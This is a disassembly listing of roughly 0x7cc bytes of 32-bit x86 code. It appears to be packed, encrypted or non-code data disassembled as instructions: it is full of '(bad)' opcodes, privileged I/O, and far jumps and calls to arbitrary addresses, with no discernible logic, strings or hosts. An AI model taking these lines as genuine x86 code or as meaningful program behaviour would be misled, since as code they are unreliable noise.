  41301f:	rcr    DWORD PTR [edx-0x2e],0x40
  413023:	outs   dx,DWORD PTR ds:[esi]
  413024:	repnz shl BYTE PTR [esi],0x2b
  413028:	outs   dx,BYTE PTR ds:[esi]
  413029:	pop    eax
  41302a:	faddp  st(3),st
  41302c:	popa   
  41302d:	ret    
  41302e:	jns    0x413027
  413030:	mov    ecx,0x785c1f78
  413035:	push   ecx
  413036:	dec    esi
  413037:	ret    
  413038:	pop    es
  413039:	mov    al,ds:0x9e0f50ef
  41303e:	dec    esp
  41303f:	neg    esi
  413041:	xchg   esi,eax
  413042:	and    al,0x56
  413044:	sub    ch,ch
  413046:	ins    BYTE PTR es:[edi],dx
  413047:	adc    eax,0x6a543d1e
  41304c:	popf   
  41304d:	fdivr  QWORD PTR [edx+0x1bbf90e2]
  413053:	xor    al,0x47
  413055:	in     eax,0x89
  413057:	mov    edx,0x590d49e7
  41305c:	ja     0x4130cb
  41305e:	xlat   BYTE PTR ds:[ebx]
  41305f:	(bad)
  413063:	adc    BYTE PTR ds:0xd6cde79c,dh
  413069:	mov    gs,edi
  41306b:	dec    ecx
  41306c:	jo     0x41307d
  41306e:	inc    esi
  41306f:	xchg   ecx,eax
  413070:	and    DWORD PTR [edx+ebp*1+0x36],ecx
  413074:	cld    
  413075:	inc    edi
  413076:	(bad)  
  413077:	in     eax,dx
  413078:	leave  
  413079:	lods   al,BYTE PTR ds:[esi]
  41307a:	addr16 pop ds
  41307c:	pop    esp
  41307d:	and    ebx,eax
  41307f:	mov    ebx,eax
  413081:	ins    BYTE PTR es:[edi],dx
  413082:	rcr    BYTE PTR [edi-0x31],1
  413085:	sbb    DWORD PTR [ebx+0x4a],esi
  413088:	push   edi
  413089:	xchg   ebx,eax
  41308a:	int3   
  41308b:	je     0x413081
  41308d:	and    ecx,esi
  41308f:	mov    ebx,0xb0950734
  413094:	fisttp DWORD PTR [edi]
  413096:	cmp    BYTE PTR [eax],al
  413098:	jle    0x4130ee
  41309a:	push   eax
  41309b:	fsub   DWORD PTR [edx-0x23e18bd9]
  4130a1:	fcomp  QWORD PTR [esi-0x7aaae034]
  4130a7:	sbb    eax,0x2fc1db36
  4130ac:	popa   
  4130ad:	xchg   esp,eax
  4130ae:	rcl    BYTE PTR [esi],cl
  4130b0:	aam    0x91
  4130b2:	pushf  
  4130b3:	mov    ss,WORD PTR [ebx+edi*8-0x13]
  4130b7:	and    DWORD PTR [ebx],esp
  4130b9:	mov    esp,0xdf6b878e
  4130be:	aaa    
  4130bf:	pusha  
  4130c0:	mov    al,0x6e
  4130c2:	(bad)  
  4130c3:	xchg   ecx,eax
  4130c4:	xchg   ebx,ecx
  4130c6:	xchg   BYTE PTR [edx+0xab6cbf1],cl
  4130cc:	aad    0x61
  4130ce:	pop    esi
  4130cf:	in     al,0x8c
  4130d1:	imul   ebx,DWORD PTR [edx+0x7b],0xffffffbc
  4130d5:	mov    ebp,0xac5f799f
  4130da:	xchg   ebp,eax
  4130db:	push   cs
  4130dc:	pop    edi
  4130dd:	xchg   ecx,eax
  4130de:	in     al,0x5
  4130e0:	nop
  4130e1:	ret    0xe783
  4130e4:	xchg   BYTE PTR [esi],al
  4130e6:	xchg   esi,eax
  4130e7:	ja     0x413084
  4130e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ea:	dec    ebx
  4130eb:	add    eax,0xea754dbc
  4130f0:	pop    esp
  4130f1:	xor    al,0x78
  4130f3:	mov    dl,0x47
  4130f5:	neg    DWORD PTR [edx-0x6f]
  4130f8:	mov    cs,WORD PTR [ebp+0x18]
  4130fb:	push   0xffffffeb
  4130fd:	scas   eax,DWORD PTR es:[edi]
  4130fe:	add    DWORD PTR [ebp*2-0x299237db],0xe5dcfe06
  413109:	dec    edi
  41310a:	lds    ebp,FWORD PTR [ebp-0x18f5250d]
  413110:	xchg   esi,eax
  413111:	mov    cl,0x5b
  413113:	cmp    bl,BYTE PTR [ebx+eax*1]
  413116:	hlt    
  413117:	jl     0x41317d
  413119:	mov    eax,0x50e68a8
  41311e:	rcl    DWORD PTR [edx],1
  413120:	jp     0x413181
  413122:	mov    bl,BYTE PTR [edx+0x4a934bd4]
  413128:	xchg   DWORD PTR [esi+edx*4],esi
  41312b:	fldenv [ebp+0x16283112]
  413131:	lods   al,BYTE PTR ds:[esi]
  413132:	xor    eax,0x18a4889e
  413137:	xchg   ebp,eax
  413138:	push   ecx
  413139:	(bad)  
  41313c:	mov    ch,0x4f
  41313e:	and    cl,bh
  413140:	int    0xca
  413142:	test   edi,edi
  413144:	dec    edi
  413145:	fldz   
  413147:	loopne 0x41310f
  413149:	lahf   
  41314a:	ud0    edx,eax
  41314d:	mov    edi,0xb47a181
  413152:	mov    edi,0x9af945aa
  413157:	add    esp,DWORD PTR [esi]
  413159:	(bad)  
  41315a:	std    
  41315b:	mov    edx,0xe3ed8f9b
  413160:	imul   ecx,DWORD PTR ds:0x18161b50,0xffffffc2
  413167:	mov    edx,0xa4602938
  41316c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316d:	shl    BYTE PTR [ecx+0x4e],cl
  413170:	xor    al,0xc9
  413172:	cld    
  413173:	pop    ebp
  413174:	popf   
  413175:	fs dec edi
  413177:	sbb    DWORD PTR [esi],edx
  413179:	adc    edx,esp
  41317b:	lea    ebp,[eax+0x6431176a]
  413181:	mov    WORD PTR [esi+0x34e232ad],cs
  413187:	push   0x8821c76a
  41318c:	es mov bl,0xec
  41318f:	ja     0x4131b3
  413191:	iret   
  413192:	nop
  413193:	adc    al,0x30
  413195:	mov    ah,0x91
  413197:	call   0x166b71c
  41319c:	arpl   WORD PTR [esi+ebp*8+0x25346ec3],ax
  4131a3:	(bad)  
  4131a4:	push   esi
  4131a5:	arpl   WORD PTR [edx],bx
  4131a7:	inc    ebx
  4131a8:	ss xchg ebx,eax
  4131aa:	jmp    0x413174
  4131ac:	xlat   BYTE PTR ds:[ebx]
  4131ad:	or     eax,0x54
  4131b0:	inc    ebp
  4131b1:	xchg   edx,eax
  4131b2:	push   0x2f29265a
  4131b7:	ret    0x371b
  4131ba:	pop    esp
  4131bb:	cli    
  4131bc:	dec    esp
  4131bd:	js     0x413150
  4131bf:	adc    al,BYTE PTR [esp+edx*1-0x1f]
  4131c3:	push   0xa991dcd5
  4131c8:	cli    
  4131c9:	in     eax,dx
  4131ca:	loopne 0x4131f7
  4131cc:	call   0xf5c0517c
  4131d1:	or     eax,0xfa82b55d
  4131d6:	inc    eax
  4131d7:	pop    ds
  4131d8:	scas   al,BYTE PTR es:[edi]
  4131d9:	lds    esp,FWORD PTR [eax]
  4131db:	les    esi,FWORD PTR [eax-0x5cc5e703]
  4131e1:	enter  0xe2b3,0xaa
  4131e5:	ins    BYTE PTR es:[edi],dx
  4131e6:	cmp    BYTE PTR [ebx-0x4c130ae2],al
  4131ec:	cmp    edi,ecx
  4131ee:	sub    bh,BYTE PTR [esi+0x39]
  4131f1:	adc    BYTE PTR [ebx+edx*8+0x68],bl
  4131f5:	jo     0x413269
  4131f7:	in     al,dx
  4131f8:	or     edi,DWORD PTR [ebx+esi*4]
  4131fb:	mov    ds:0xca51b4f2,al
  413200:	lods   eax,DWORD PTR ds:[esi]
  413201:	mov    eax,ds:0x59a82dcb
  413206:	in     al,0x51
  413208:	add    al,0xbd
  41320a:	push   ecx
  41320b:	mov    dh,BYTE PTR [edi+0x41]
  41320e:	add    ch,BYTE PTR [edx]
  413210:	add    al,dh
  413212:	and    bh,dh
  413214:	mov    bl,0x22
  413216:	adc    DWORD PTR ds:0xb1b627e5,edi
  41321c:	test   BYTE PTR [edi-0x2e],0x9d
  413220:	dec    edi
  413221:	cmp    cl,BYTE PTR [esi+0x0]
  413224:	aad    0x97
  413226:	dec    edx
  413227:	add    eax,0xa1d06510
  41322c:	scas   eax,DWORD PTR es:[edi]
  41322d:	es xchg edi,eax
  41322f:	mov    eax,ds:0x97bb1335
  413234:	jmp    0x5278fdf9
  413239:	mov    ah,0x22
  41323b:	jmp    0xf28c:0x17c62c44
  413242:	sbb    edi,DWORD PTR [ecx-0x23]
  413245:	popa   
  413246:	stos   BYTE PTR es:[di],al
  413248:	(bad)  
  413249:	push   0x7136e692
  41324e:	dec    edi
  41324f:	push   edx
  413250:	das    
  413251:	and    dh,BYTE PTR [esi]
  413253:	cmp    ebp,edx
  413255:	gs (bad) 
  413257:	retf   
  413258:	(bad)  
  413259:	xor    edi,ebx
  41325b:	fdiv   DWORD PTR [ecx+0x5462db99]
  413261:	lods   eax,DWORD PTR ds:[esi]
  413262:	(bad)  [edx]
  413264:	outs   dx,BYTE PTR ds:[esi]
  413265:	jo     0x41329c
  413267:	dec    eax
  413268:	in     eax,dx
  413269:	rcr    DWORD PTR [ebx+0x58f1e302],1
  41326f:	es xchg edi,eax
  413271:	push   ebp
  413272:	or     BYTE PTR [ebx],bl
  413274:	fisubr WORD PTR [esp+esi*8-0x7b486810]
  41327b:	ss (bad) 
  41327d:	push   0xffffffca
  41327f:	hlt    
  413280:	xor    BYTE PTR [edi+0x2d02ffcc],0xc5
  413287:	sbb    eax,0x528bd40e
  41328c:	xchg   ebx,eax
  41328d:	call   0xe885d44a
  413292:	add    esi,DWORD PTR [eiz*2+0x261a1ae8]
  413299:	xchg   edx,eax
  41329a:	inc    ecx
  41329b:	add    BYTE PTR [esi-0x12661b3e],bh
  4132a1:	cs pushf 
  4132a3:	dec    esp
  4132a4:	push   eax
  4132a5:	imul   ecx,ebx,0x7c
  4132a8:	add    al,dh
  4132aa:	repz xor dl,al
  4132ad:	xchg   edi,eax
  4132ae:	daa    
  4132af:	(bad)  
  4132b0:	cmp    DWORD PTR [edx+0x4b36fd1f],ebp
  4132b6:	ds loop 0x4132f3
  4132b9:	fstp   QWORD PTR [ebx+0x62fd015d]
  4132bf:	mov    bl,0x4c
  4132c1:	(bad)  
  4132c2:	add    eax,0x8a62dd50
  4132c7:	cli    
  4132c8:	pop    esp
  4132c9:	pop    ebx
  4132ca:	xchg   ecx,eax
  4132cb:	out    0x48,eax
  4132cd:	sahf   
  4132ce:	in     al,dx
  4132cf:	cmp    ecx,DWORD PTR [edx-0x6a627f85]
  4132d5:	loop   0x41332e
  4132d7:	push   edx
  4132d8:	xchg   edi,eax
  4132d9:	mov    ebp,0xb2efef81
  4132de:	(bad)  cs:[edx+0x7f92ce0]
  4132e5:	inc    eax
  4132e6:	cs dec edx
  4132e8:	fadd   QWORD PTR [ebp-0x15a1564a]
  4132ee:	daa    
  4132ef:	and    al,0x28
  4132f1:	push   ss
  4132f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f3:	(bad)  
  4132f4:	sbb    al,0x91
  4132f6:	(bad)  [edi]
  4132f8:	inc    edi
  4132f9:	push   ds
  4132fa:	jae    0x41328a
  4132fc:	repnz mov edi,0x73ca4149
  413302:	xchg   ecx,eax
  413303:	xchg   edi,eax
  413304:	push   cs
  413305:	loope  0x4132ae
  413307:	jmp    0x3d2c34d
  41330c:	pop    es
  41330d:	inc    ebx
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	repz clc 
  413311:	sub    BYTE PTR [ecx+0x4e],ch
  413314:	xchg   esi,eax
  413315:	ins    DWORD PTR es:[edi],dx
  413316:	xor    ebx,DWORD PTR [ebp-0x65cf6bfb]
  41331c:	imul   eax,DWORD PTR [esi-0x1],0xdc9a06d5
  413323:	xchg   BYTE PTR [esi-0x699f7990],ch
  413329:	gs mov esi,0xa41cc609
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	and    DWORD PTR [esi],0xb3f86b
  413336:	in     al,dx
  413337:	xchg   ebp,eax
  413338:	mov    ebp,0xcca8c508
  41333d:	mov    dl,0x4e
  41333f:	fcomp  st(0)
  413341:	pop    esp
  413342:	mov    eax,0xd0ee28b7
  413347:	push   cs
  413348:	(bad)  
  413349:	into   
  41334a:	jle    0x4133c4
  41334c:	(bad)  
  41334d:	and    eax,0xf2cd24c9
  413352:	inc    ecx
  413353:	sub    cl,dl
  413355:	jo     0x4132fd
  413357:	scas   eax,DWORD PTR es:[edi]
  413358:	jne    0x413309
  41335a:	leave  
  41335b:	sbb    bl,0x9
  41335e:	fisubr DWORD PTR [esi+0x4b]
  413361:	jle    0x4132ef
  413363:	dec    ebp
  413364:	lahf   
  413365:	outs   dx,BYTE PTR ds:[esi]
  413366:	xor    BYTE PTR [edx+eax*4],ch
  413369:	mov    eax,ds:0x4c699265
  41336e:	ror    al,1
  413370:	addr16 popa 
  413372:	dec    esi
  413373:	xor    DWORD PTR [eax],eax
  413375:	(bad)  
  413377:	ins    DWORD PTR es:[edi],dx
  413378:	inc    esi
  413379:	dec    ecx
  41337a:	and    al,0xb3
  41337c:	xor    BYTE PTR [ebp-0x654eafc2],dh
  413382:	or     bh,BYTE PTR [edi-0xd40da3e]
  413388:	push   ecx
  413389:	add    bl,ch
  41338b:	inc    ebx
  41338c:	ins    BYTE PTR es:[edi],dx
  41338d:	mov    ch,0x32
  41338f:	inc    esp
  413390:	imul   ebp,DWORD PTR [edx-0x7c107cda],0x73
  413397:	repz mov ecx,0x97e1ba14
  41339d:	icebp  
  41339e:	xor    eax,0x1df75e83
  4133a3:	addr16 in eax,dx
  4133a5:	jle    0x4133ad
  4133a7:	call   0xaf98:0x98036684
  4133ae:	push   0xf49e359b
  4133b3:	push   ds
  4133b4:	push   cs
  4133b5:	popa   
  4133b6:	xor    al,0x50
  4133b8:	sub    BYTE PTR [eax],bh
  4133ba:	test   al,bl
  4133bc:	iret   
  4133bd:	dec    esp
  4133be:	hlt    
  4133bf:	jle    0x41334b
  4133c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133c2:	cli    
  4133c3:	adc    DWORD PTR [ebx+ebx*4],0x81ca5094
  4133ca:	push   edx
  4133cb:	ins    DWORD PTR es:[edi],dx
  4133cc:	push   edi
  4133cd:	mov    bh,0xf5
  4133cf:	int    0xe4
  4133d1:	sub    al,0x4
  4133d3:	stos   BYTE PTR es:[edi],al
  4133d4:	push   ebp
  4133d5:	in     eax,0xda
  4133d7:	stc    
  4133d8:	outs   dx,BYTE PTR ds:[esi]
  4133d9:	xchg   esi,eax
  4133da:	stos   BYTE PTR es:[edi],al
  4133db:	loope  0x413397
  4133dd:	mov    DWORD PTR [edi],edx
  4133df:	shl    DWORD PTR [edi],1
  4133e1:	jne    0x413405
  4133e3:	push   0x7cb70856
  4133e8:	dec    edx
  4133e9:	sbb    DWORD PTR [ebx-0x5c],ebx
  4133ec:	shl    BYTE PTR [ebp-0x6cb2b8e0],1
  4133f2:	int3   
  4133f3:	mov    edx,0x10a823
  4133f8:	cmp    DWORD PTR [ebp+0x18],ebp
  4133fb:	push   ebx
  4133fc:	iret   
  4133fd:	push   es
  4133fe:	call   0x829bdb10
  413403:	(bad)  
  413404:	popf   
  413405:	jno    0x4133a0
  413407:	jbe    0x4133f8
  413409:	mov    dh,0x86
  41340b:	dec    ebp
  41340c:	push   ebx
  41340d:	fcom   QWORD PTR [edi-0x15671d73]
  413413:	pusha  
  413414:	dec    eax
  413415:	dec    esp
  413416:	out    dx,al
  413417:	mov    ecx,0x1d64b5c3
  41341c:	push   ebp
  41341d:	mov    al,0x51
  41341f:	push   esp
  413420:	stos   BYTE PTR es:[edi],al
  413421:	dec    esi
  413422:	mov    cl,0xa1
  413424:	stc    
  413425:	sbb    BYTE PTR [edi],bl
  413427:	add    esp,ebx
  413429:	pop    ds
  41342a:	adc    eax,0x8a1a6ab4
  41342f:	in     al,dx
  413430:	in     eax,0x4a
  413432:	ja     0x4134ad
  413434:	xchg   ecx,eax
  413435:	xor    DWORD PTR [esi-0x1],ebp
  413438:	stos   BYTE PTR es:[edi],al
  413439:	xchg   DWORD PTR [ebx+0x78],esi
  41343c:	adc    eax,0x5577cbf0
  413441:	mov    ebp,0x3ad3fd21
  413446:	cs pop es
  413448:	pop    ebp
  413449:	(bad)  
  41344a:	xchg   BYTE PTR es:[edi],ch
  41344d:	ss das 
  41344f:	fwait
  413450:	jecxz  0x413481
  413452:	popf   
  413453:	jne    0x41341a
  413455:	jg     0x41342c
  413457:	sub    ebx,DWORD PTR [edi-0x4]
  41345a:	iret   
  41345b:	and    al,0xdf
  41345d:	or     DWORD PTR [eax-0x6eb0600],ebx
  413463:	setne  BYTE PTR [eax-0x616fbd95]
  41346a:	adc    ecx,DWORD PTR [ebx+eiz*4-0x49bfc8e9]
  413471:	push   ss
  413472:	(bad)  
  413473:	es dec esi
  413475:	mov    cl,BYTE PTR [ecx]
  413477:	pop    edx
  413478:	mov    edx,0x8609fff4
  41347d:	in     al,0xb3
  41347f:	xchg   ebx,eax
  413480:	es adc al,0x7a
  413483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413484:	dec    esi
  413485:	push   cs
  413486:	test   eax,0xe07bf7cb
  41348b:	pushf  
  41348c:	in     eax,dx
  41348d:	out    dx,eax
  41348e:	fsubr  QWORD PTR [edx]
  413490:	xor    DWORD PTR [ebx],0x57
  413493:	dec    edx
  413494:	lock mov edi,0x8ef4c9fd
  41349a:	cmp    DWORD PTR [edi+0x5350db59],ebp
  4134a0:	cmp    al,dh
  4134a2:	jmp    0xda15:0x50dfb808
  4134a9:	stc    
  4134aa:	hlt    
  4134ab:	pop    esp
  4134ac:	mov    bl,0x67
  4134ae:	dec    esp
  4134af:	mov    cl,0x20
  4134b1:	cmp    al,0xc
  4134b3:	sub    DWORD PTR [eax+0x30afe67c],ecx
  4134b9:	xor    eax,0x94e7fb9b
  4134be:	push   ebx
  4134bf:	xor    edi,ebp
  4134c1:	shl    DWORD PTR [ebx],1
  4134c3:	pop    ecx
  4134c4:	ins    BYTE PTR es:[edi],dx
  4134c5:	lock fcom DWORD PTR [edi+0x254a1f89]
  4134cc:	xchg   esp,eax
  4134cd:	mov    BYTE PTR [eax],0x31
  4134d0:	in     eax,0x54
  4134d2:	dec    esp
  4134d3:	ss push esi
  4134d5:	xor    esp,ebp
  4134d7:	jecxz  0x4134a9
  4134d9:	push   ss
  4134da:	adc    al,0x7e
  4134dc:	cmc    
  4134dd:	jnp    0x413508
  4134df:	xchg   ecx,eax
  4134e0:	dec    ecx
  4134e1:	fs cs add al,ah
  4134e5:	mov    eax,0xd44b0b3c
  4134ea:	mov    eax,0xfac21f3
  4134ef:	test   ebx,ebp
  4134f1:	dec    edi
  4134f2:	mov    edx,0xe0999252
  4134f7:	add    al,0x13
  4134f9:	add    eax,0xcc845729
  4134fe:	mov    edi,0x6d399fe2
  413503:	jae    0x413526
  413505:	popa   
  413506:	test   al,0x9e
  413508:	pop    esi
  413509:	shr    DWORD PTR [ebp-0x42d3e948],0x9a
  413510:	mov    ebx,DWORD PTR [edx*2+0x6eb80775]
  413517:	mov    cl,0xf5
  413519:	pop    ebp
  41351a:	in     eax,dx
  41351b:	hlt    
  41351c:	fimul  WORD PTR [ecx-0x41]
  41351f:	mov    edi,0x78b25959
  413524:	popf   
  413525:	cmp    ecx,edx
  413527:	mov    al,ds:0x7807f0a7
  41352c:	divps  xmm4,XMMWORD PTR [ebx+0x20388694]
  413533:	xchg   esi,eax
  413534:	mov    ds,WORD PTR es:[eax]
  413537:	sahf   
  413538:	push   edi
  413539:	mov    ebp,0x485823f5
  41353e:	adc    ebx,DWORD PTR [edx-0x3c]
  413541:	sbb    BYTE PTR [ebp+ebx*1+0x67e998d5],dh
  413548:	sbb    DWORD PTR [eax],ebx
  41354a:	aam    0x7
  41354c:	mov    eax,0x3e70c91
  413551:	es xchg edx,eax
  413553:	mov    bh,0x77
  413555:	leave  
  413556:	fwait
  413557:	inc    eax
  413558:	xor    DWORD PTR [ebp+0x1bf922f5],esp
  41355e:	mov    edi,0x879220e9
  413563:	aam    0xda
  413565:	outs   dx,BYTE PTR ds:[esi]
  413566:	test   eax,0x29ff566a
  41356b:	idiv   BYTE PTR [ebx+ecx*2]
  41356e:	stos   DWORD PTR es:[edi],eax
  41356f:	nop
  413570:	addr16 push edi
  413572:	add    al,0xa0
  413574:	scas   eax,DWORD PTR es:[edi]
  413575:	test   al,0x58
  413577:	clc    
  413578:	bound  ecx,QWORD PTR [eax-0x3e]
  41357b:	(bad)  
  41357c:	scas   eax,DWORD PTR es:[edi]
  41357d:	push   esp
  41357e:	or     BYTE PTR [edx+0x2358d46f],bh
  413584:	cmc    
  413585:	cwde   
  413586:	stos   DWORD PTR es:[edi],eax
  413587:	and    edi,eax
  413589:	mov    ebx,DWORD PTR [edx]
  41358b:	jmp    0x4135c5
  41358d:	call   0x88b8162c
  413592:	inc    ecx
  413593:	loopne 0x41357e
  413595:	push   esp
  413596:	lahf   
  413597:	mov    ds:0x16bba8cb,eax
  41359c:	sub    DWORD PTR [esi],edi
  41359e:	(bad)
  4135a2:	loope  0x4135de
  4135a4:	repz sbb al,0x68
  4135a7:	mov    ah,0x60
  4135a9:	loope  0x4135f7
  4135ab:	or     al,0x4f
  4135ad:	test   DWORD PTR [ecx+esi*4],ecx
  4135b0:	shl    BYTE PTR [ebx],cl
  4135b2:	sbb    eax,0x9019adc7
  4135b7:	aas    
  4135b8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4135ba:	or     al,0x2d
  4135bc:	jg     0x41359b
  4135be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135bf:	ror    eax,0x62
  4135c2:	mov    ch,0xd5
  4135c4:	cld    
  4135c5:	mov    ch,al
  4135c7:	cs xchg bl,dh
  4135ca:	cmp    BYTE PTR [ebx-0x38],dh
  4135cd:	or     eax,0x251dceb2
  4135d2:	hlt    
  4135d3:	xchg   DWORD PTR [esi+eiz*4],eax
  4135d6:	pop    ds
  4135d7:	pop    esi
  4135d8:	(bad)  
  4135d9:	mov    esp,0x28858de8
  4135de:	dec    esi
  4135df:	jne    0x4135f9
  4135e1:	jle    0x413632
  4135e3:	sub    al,0xde
  4135e5:	pushf  
  4135e6:	loope  0x41363a
  4135e8:	test   cl,ah
  4135ea:	loopne 0x4135d9
  4135ec:	in     eax,0xa7
  4135ee:	mul    BYTE PTR [edi+0x29735d8f]
  4135f4:	into   
  4135f5:	pop    ebp
  4135f6:	fisub  DWORD PTR [edi+edi*2]
  4135f9:	xchg   ebp,eax
  4135fa:	lahf   
  4135fb:	jo     0x41364d
  4135fd:	gs aad 0x3
  413600:	adc    DWORD PTR [ebx],ebp
  413602:	inc    ebp
  413603:	dec    ebp
  413604:	addr16 mov esi,0x4987e15e
  41360a:	aas    
  41360b:	jo     0x41363d
  41360d:	jl     0x4135c8
  41360f:	mov    ds:0x422e6f9b,al
  413614:	popa   
  413615:	aad    0xde
  413617:	into   
  413618:	jne    0x41360d
  41361a:	cmp    dl,bh
  41361c:	jge    0x413659
  41361e:	dec    ecx
  41361f:	xchg   BYTE PTR [ecx-0x3a],ch
  413622:	stos   DWORD PTR es:[edi],eax
  413623:	scas   al,BYTE PTR es:[edi]
  413624:	rcl    DWORD PTR [esp+ecx*4-0x52],cl
  413628:	loopne 0x41364a
  41362a:	nop
  41362b:	jmp    0x87546631
  413630:	or     esp,ebx
  413632:	dec    DWORD PTR [ecx+esi*4+0x36aa9de3]
  413639:	inc    esi
  41363a:	cmc    
  41363b:	or     DWORD PTR [ebx+0x373e16f],0x5017eb08
  413645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413646:	pop    esp
  413647:	int    0x14
  413649:	sub    BYTE PTR [esi+0x44],al
  41364c:	and    ebp,DWORD PTR [ebx]
  41364e:	cs cmp dh,bh
  413651:	add    BYTE PTR [ebx+0x4d],dh
  413654:	xchg   ebx,eax
  413655:	fidiv  WORD PTR [ebx]
  413657:	pusha  
  413658:	mov    ds:0xb8f03ae,al
  41365d:	aaa    
  41365e:	xchg   edx,eax
  41365f:	cli    
  413660:	and    dh,bh
  413662:	in     eax,0xf5
  413664:	call   0xe6483504
  413669:	mov    ebp,DWORD PTR [ebx+0x3be139]
  41366f:	pop    ebx
  413670:	lds    edi,FWORD PTR [ebp-0x5b]
  413673:	mov    bl,0x2f
  413675:	jmp    0xf40a:0xf7fcd31e
  41367c:	and    esi,ebx
  41367e:	xchg   DWORD PTR [esi+0x337e4197],esp
  413684:	pop    ebx
  413685:	aaa    
  413686:	(bad)  
  413687:	cmp    ah,BYTE PTR [ebp-0x7a]
  41368a:	cli    
  41368b:	gs leave 
  41368d:	pop    esi
  41368e:	sti    
  41368f:	add    eax,0x5b2397b9
  413694:	aaa    
  413695:	mov    dh,0x5b
  413697:	add    ah,BYTE PTR [edx]
  413699:	or     ebx,DWORD PTR [ebx-0x43]
  41369c:	clc    
  41369d:	imul   eax,DWORD PTR [edx],0x5b
  4136a0:	cdq    
  4136a1:	int3   
  4136a2:	into   
  4136a3:	mov    edx,DWORD PTR ds:0x45cd348e
  4136a9:	(bad)  
  4136aa:	xor    bh,al
  4136ac:	mov    esp,0x9ddd4b76
  4136b1:	scas   eax,DWORD PTR es:[edi]
  4136b2:	push   edx
  4136b3:	xchg   ebx,eax
  4136b4:	push   cs
  4136b5:	or     al,0x5b
  4136b7:	pop    edi
  4136b8:	adc    BYTE PTR [edi+edx*1],dh
  4136bb:	je     0x4136fa
  4136bd:	out    dx,al
  4136be:	shl    DWORD PTR [ebp-0xd],cl
  4136c1:	xchg   ecx,eax
  4136c2:	and    bh,BYTE PTR gs:[edx+0x61e03207]
  4136c9:	xor    edi,DWORD PTR [ebx-0x5a]
  4136cc:	mov    ecx,edi
  4136ce:	cmp    al,0x3
  4136d0:	je     0x4136d8
  4136d2:	in     al,dx
  4136d3:	mov    ebx,0xf485dbe8
  4136d8:	in     eax,dx
  4136d9:	pop    es
  4136da:	mov    ah,0x0
  4136dc:	bound  eax,QWORD PTR [ecx]
  4136de:	or     al,0xb2
  4136e0:	aaa    
  4136e1:	retf   
  4136e2:	jo     0x4136a6
  4136e4:	jne    0x413681
  4136e6:	and    bl,BYTE PTR [ecx]
  4136e8:	xchg   esp,eax
  4136e9:	sub    esi,DWORD PTR ds:0x36b61b07
  4136ef:	jecxz  0x4136ac
  4136f1:	gs popa 
  4136f3:	inc    eax
  4136f4:	inc    ebx
  4136f5:	mov    dh,BYTE PTR [edx+0x3e]
  4136f8:	mov    ds:0x2fe59d0c,al
  4136fd:	xor    edx,0x8def1cc9
  413703:	(bad)  
  413704:	jmp    0x4136a9
  413706:	nop
  413707:	fist   WORD PTR [edx]
  413709:	stc    
  41370a:	std    
  41370b:	test   BYTE PTR [edi+0x42],cl
  41370e:	sbb    ecx,DWORD PTR [edx+0x43]
  413711:	pop    ebp
  413712:	mov    DWORD PTR [ebp-0x36],ecx
  413715:	xchg   BYTE PTR [esi-0x7c],bl
  413718:	bound  ebp,QWORD PTR [esi]
  41371a:	mov    dl,0xac
  41371c:	xor    dh,cl
  41371e:	or     DWORD PTR [edx],ebp
  413720:	xor    esi,DWORD PTR [esi-0x633712f0]
  413726:	out    dx,eax
  413727:	xchg   edi,eax
  413728:	call   0xa9751e9e
  41372d:	not    DWORD PTR [ebx+0x74e5d4be]
  413733:	and    eax,0x1b4b0677
  413738:	adc    DWORD PTR [eax+0x5f164baa],ecx
  41373e:	push   0x5e7664c8
  413743:	cmp    eax,0x953f53b2
  413748:	cmp    cl,BYTE PTR [ecx+0x55]
  41374b:	jmp    0xfbc9:0x27738b9b
  413752:	cdq    
  413753:	sub    eax,0x38c652fe
  413758:	fild   WORD PTR [ecx-0x32]
  41375b:	enter  0xa0b1,0x8
  41375f:	dec    edi
  413760:	jno    0x413753
  413762:	mov    bl,0x34
  413764:	jnp    0x41375c
  413766:	cwde   
  413767:	cwde   
  413768:	cmp    dh,BYTE PTR [edi-0x31ee38a0]
  41376e:	xor    al,0x62
  413770:	mov    ds:0xeb430583,eax
  413775:	xor    al,0x4e
  413777:	push   cs
  413778:	stos   BYTE PTR es:[edi],al
  413779:	lea    ebx,[ecx+0x2c]
  41377c:	call   0x639aa5b0
  413781:	push   ebx
  413782:	push   edx
  413783:	adc    al,0x18
  413785:	sbb    BYTE PTR [ecx+eiz*1+0x47930db1],bl
  41378c:	test   al,0x5e
  41378e:	fild   DWORD PTR [esi]
  413790:	add    al,0xbe
  413792:	pop    ecx
  413793:	lods   eax,DWORD PTR ds:[esi]
  413794:	mov    edx,0x6dab4559
  413799:	inc    eax
  41379a:	mov    ds:0x938e175a,al
  41379f:	stc    
  4137a0:	xchg   esp,eax
  4137a1:	pop    ds
  4137a2:	daa    
  4137a3:	adc    DWORD PTR [edx],edi
  4137a5:	cld    
  4137a6:	jo     0x41379b
  4137a8:	ss dec esp
  4137aa:	gs aaa 
  4137ac:	xchg   ecx,eax
  4137ad:	or     dl,BYTE PTR [eax-0x60]
  4137b0:	add    al,0xd5
  4137b2:	push   ds
  4137b3:	test   BYTE PTR [eax+edx*4],0x57
  4137b7:	dec    ecx
  4137b8:	push   edi
  4137b9:	xchg   esp,eax
  4137ba:	aas    
  4137bb:	test   al,0xc4
  4137bd:	xchg   ebp,eax
  4137be:	(bad)  
  4137bf:	not    ah
  4137c1:	cli    
  4137c2:	push   eax
  4137c3:	mov    BYTE PTR [edi-0x46151da3],cl
  4137c9:	shl    dl,cl
  4137cb:	outs   dx,BYTE PTR ds:[esi]
  4137cc:	rcr    DWORD PTR [edi-0x3d],cl
  4137cf:	icebp  
  4137d0:	dec    ebx
  4137d1:	sbb    bh,BYTE PTR [ecx-0x235d35bc]
  4137d7:	je     0x413850
  4137d9:	mov    cl,0xb9
  4137db:	inc    edi
  4137dc:	stc    
  4137dd:	ins    DWORD PTR es:[edi],dx
  4137de:	mov    eax,0xb96962ad
  4137e3:	push   es
  4137e4:	imul   ebp,esp,0x44de4833
  4137ea:	rcr    BYTE PTR [ebx],cl
